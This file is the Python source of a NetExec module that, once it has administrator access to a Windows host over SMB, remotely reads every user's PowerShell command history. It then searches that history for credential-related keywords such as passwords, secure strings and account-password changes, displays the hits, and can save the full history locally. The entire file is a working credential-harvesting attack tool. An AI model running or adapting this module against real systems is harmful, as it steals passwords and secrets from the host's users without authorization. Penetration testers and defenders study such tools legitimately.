import traceback
import os
from impacket.examples.secretsdump import RemoteOperations
from nxc.paths import NXC_PATH

class NXCModule:
    """Module by @357384n"""

    name = "powershell_history"
    description = "Extracts PowerShell history for all users and looks for sensitive commands."
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    # Class-level constants for sensitive keywords and PowerShell command
    SENSITIVE_KEYWORDS = [
        "password", "passwd", "passw", "secret", "credential", "key",
        "get-credential", "convertto-securestring", "set-localuser",
        "new-localuser", "set-adaccountpassword", "new-object system.net.webclient",
        "invoke-webrequest", "invoke-restmethod"
    ]

    POWERSHELL_HISTORY_COMMAND = (
        'powershell.exe "type C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"'
    )

    def options(self, context, module_options):
        """To export all the history you can add the following option: -o export=True"""
        context.log.info(f"Received module options: {module_options}")
        self.export = module_options.get('export', 'false').lower() == 'true'
        context.log.info(f"Option export set to: {self.export}")

    def handle_error(self, context, error, message):
        """Logs the error message and the exception traceback."""
        context.log.fail(f"{message}: {error}")
        context.log.debug(traceback.format_exc())

    def get_powershell_history(self, connection):
        """Get the PowerShell history for all users."""
        if connection is None:
            raise ValueError("Invalid connection object passed.")

        try:
            history_output = connection.execute(self.POWERSHELL_HISTORY_COMMAND, True)
            if not history_output:
                raise RuntimeError("PowerShell history command returned no output.")
            return history_output.split('\n')

        except ConnectionError as e:
            raise RuntimeError(f"Connection error while retrieving PowerShell history: {e}")

        except Exception as e:
            raise RuntimeError(f"Could not retrieve PowerShell history: {e}")

    def analyze_history(self, history):
        """Analyze PowerShell history for sensitive information."""
        # Use list comprehension to identify sensitive commands
        return [
            command.strip()
            for command in history
            if any(keyword in command.lower() for keyword in self.SENSITIVE_KEYWORDS)
        ]

    def export_history(self, context, host, history):
        """Export the history to a file."""
        try:
            export_dir = os.path.join(NXC_PATH, "modules", "powershell_history")
            os.makedirs(export_dir, exist_ok=True)
            filename = os.path.join(export_dir, f"{host}.powershell_history.txt")
            with open(filename, "w") as file:
                file.write('\n'.join(history) + '\n')
            context.log.info(f"History written to {filename}")
        except Exception as e:
            self.handle_error(context, e, "Failed to write history")

    def on_admin_login(self, context, connection):
        """Main function to retrieve and analyze PowerShell history."""
        try:
            context.log.info("Retrieving PowerShell history...")
            history = self.get_powershell_history(connection)
            if not history:
                context.log.info("No PowerShell history found.")
                return

            sensitive_commands = self.analyze_history(history)
            if sensitive_commands:
                context.log.highlight("Sensitive commands found in PowerShell history:")
                for command in sensitive_commands:
                    context.log.highlight(f"  {command}")
            else:
                context.log.info("No sensitive commands found in PowerShell history.")

            if self.export:
                self.export_history(context, connection.host, history)

        except Exception as e:
            self.handle_error(context, e, "UNEXPECTED ERROR")
